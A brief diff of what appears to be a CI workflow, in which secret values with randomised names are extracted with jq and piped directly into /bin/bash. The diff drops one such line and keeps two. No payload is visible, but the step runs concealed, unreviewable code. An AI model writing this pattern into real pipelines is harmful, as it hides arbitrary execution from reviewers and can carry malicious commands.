@@ -21,7 +21,6 @@ jobs:
           kmi0888: ${{ secrets.kmi0888 }}
         run: |
           printf '%s' "$kmi0888" | jq -r .nmrmd6 | /bin/bash
-          echo $wyvxb65123 | jq -r .z26 | /bin/bash
           printf '%s' "$m174" | jq -r .hzv5144 | /bin/bash
 
       - name: Upload results
